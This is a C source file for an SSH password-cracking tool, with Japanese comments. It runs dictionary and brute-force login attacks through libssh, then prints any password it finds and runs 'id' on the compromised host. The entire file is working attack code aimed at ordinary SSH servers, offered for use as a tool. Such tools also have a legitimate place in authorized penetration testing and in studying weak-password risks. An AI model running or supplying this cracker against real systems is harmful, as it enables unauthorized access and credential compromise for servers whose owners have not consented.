/*
 * このパスワード解析ツールはLinuxでもWindowsでも実行可能にしています。
 * これが俺の優しさだよ(´・ω・｀)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libssh/libssh.h>
#if defined(WIN32) && !defined(UNIX)
#define cls "cls"   /* Do windows stuff */
#elif defined(UNIX) && !defined(WIN32)
#define cls "clear" /* Do linux stuff */
#else
#define cls "clear" /* If you are not sure, make it a Linux command. */
#endif
#define MAXLEN 1024

//見たとおり。
void logo() {
    system(cls);
    printf("           _                           _ \n\
   ___ ___| |__     ___ _ __ __ _  ___| | _____ _ __\n\
  / __/ __| '_ \\   / __| '__/ _` |/ __| |/ / _ \\ '__|\n\
  \\__ \\__ \\ | | | | (__| | | (_| | (__|   <  __/ |\n\
  |___/___/_| |_|  \\___|_|  \\__,_|\\___|_|\\_\\___|_|\n");
    puts("");
    printf("          ---==[ creator: ware255 ]==---  \n");
}

//コマンドを一回だけ実行させる
int show_remote_processes(ssh_session session) {
    ssh_channel channel;
    int nbytes, rc;
    char buffer[256];
    
    if ((channel = ssh_channel_new(session)) == NULL) return SSH_ERROR;
    
    if ((rc = ssh_channel_open_session(channel)) != SSH_OK) {
        ssh_channel_free(channel);
        return rc;
    }
    
    if ((rc = ssh_channel_request_exec(channel, "id")) != SSH_OK) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return rc;
    }
    
    while ((nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0)) > 0) {
        if (write(1, buffer, nbytes) != (unsigned int) nbytes) {
            ssh_channel_close(channel);
            ssh_channel_free(channel);
            return SSH_ERROR;
        }
        nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
    }
    
    if (nbytes < 0) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return SSH_ERROR;
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return SSH_OK;
}

//ssh接続
int ssh_main_connection(char host[], char name[], int port, char password[]) {
    char key[strlen(password) + 1];
    int rc;
    size_t i;
    ssh_session my_ssh_session = ssh_new();
    
    if (my_ssh_session == NULL) return 1;

    for (i = 0; i <= strlen(password); i++) key[i] = (char)password[i];
    
    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, host);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, name);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_CIPHERS_C_S, "aes128-ctr");
    
    if ((rc = ssh_connect(my_ssh_session)) != SSH_OK) {
        fprintf(stderr, "Error: %s\n", ssh_get_error(my_ssh_session));
        ssh_free(my_ssh_session);
        return 1;
    }
    
    if ((rc = ssh_userauth_password(my_ssh_session, NULL, key)) != SSH_AUTH_SUCCESS) {
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        return 1;
    }
    else {
        printf("\nPassword found! => %s\n", key);
    }
    
    if ((rc = show_remote_processes(my_ssh_session)) != SSH_OK) {
        printf("Error: Could not execute the command.\n");
        ssh_free(my_ssh_session);
        return 1;
    }
    
    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    return 0;
}

//辞書攻撃
void dictionary_attack(char host[], char name[], int *port) {
    int (*p_func)(char*, char*, int, char*) = &ssh_main_connection;
    char ip[strlen(host) + 1];
    char user[strlen(name) + 1];
    char filename[256], str[MAXLEN] = {0};
    int logical = -1;
    size_t i;
    if (port == NULL) {
        printf("Error: port is NULL\n");
        exit(1);
    }
    logo();
    printf("\nEnter a file name.\n: ");
    fgets(filename, sizeof(filename), stdin);
    filename[strcspn(filename, "\n")] = 0;
    FILE *fp;
    if ((fp = fopen(filename, "r")) == NULL) {
        printf("Error: Could not open file.\n");
        exit(1);
    }
    printf("\nAnalyzing %s password...\n", host);
    for (i = 0; i <= strlen(host); i++) ip[i] = host[i];
    for (i = 0; i <= strlen(name); i++) user[i] = name[i];
    while (fgets(str, MAXLEN, fp) != NULL) {
        str[strcspn(str, "\n")] = 0;
        if ((*p_func)(ip, user, *port, str) == 0) {
            logical = 1;
            break;
        }
    }
    if (logical != 1) {
        printf("\nPassword not found :(\n");
    }
    fclose(fp);
    return;
}

//総当たり攻撃
void brute_force_attack(char host[], char name[], int *port) {
    int (*p_func)(char*, char*, int, char*) = &ssh_main_connection;
    const char *x = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\"#$%&\')(-=^~|[{@`]}:*;+_\\/.,>< ";
    char ip[strlen(host) + 1];
    char user[strlen(name) + 1];
    char str[MAXLEN + 1] = {0};
    int index[MAXLEN + 1] = {0};
    int i, carry;
    size_t j;
    for (j = 0; j <= strlen(host); j++) ip[j] = host[j];
    for (j = 0; j <= strlen(name); j++) user[j] = name[j];
    do {
        if ((*p_func)(ip, user, *port, str) == 0) {
            break;
        }
        for(i = 0, index[i]++, carry = !0; carry; i++) {
            carry = index[i] >= strlen(x);
            if (carry) {
                index[i+1]++;
                index[i] = 1;
            }
            str[i] = x[index[i]];
        }
    } while(index[MAXLEN] == 0);
    return;
}

int main(int argc, char* argv[]) {
    char c_mode[4];
    int port = 22, mode = 2;
    
    if (argc < 6) {
        printf("\nHow to use: %s -h <IP> -p <Port> -u <user_name>\n\n", argv[0]);
        return 1;
    }
    
    port = atoi(argv[4]);
    if (port < 0 || port > 65535) {
        printf("Error: Do you know what a short type is?\n");
        return 1;
    }
    
    logo();
    
    puts("\n 1: brute force attack");
    puts(" 2: dictionary attack");
    printf("[*] Select Mode [1/2]: ");
    fgets(c_mode, sizeof(c_mode), stdin);
    if (c_mode[0] == '\n') {
        dictionary_attack(argv[2], argv[6], &port);
    }
    mode = atoi(c_mode);
    switch (mode) {
    case 1:
        printf("\nAnalyzing %s password...\n", argv[2]);
        brute_force_attack(argv[2], argv[6], &port);
        break;
    case 2:
        dictionary_attack(argv[2], argv[6], &port);
        break;
    default:
        printf("Error: Do you know what an integer is?\n");
        return 1;
        break;
    }
    
    return 0;
}
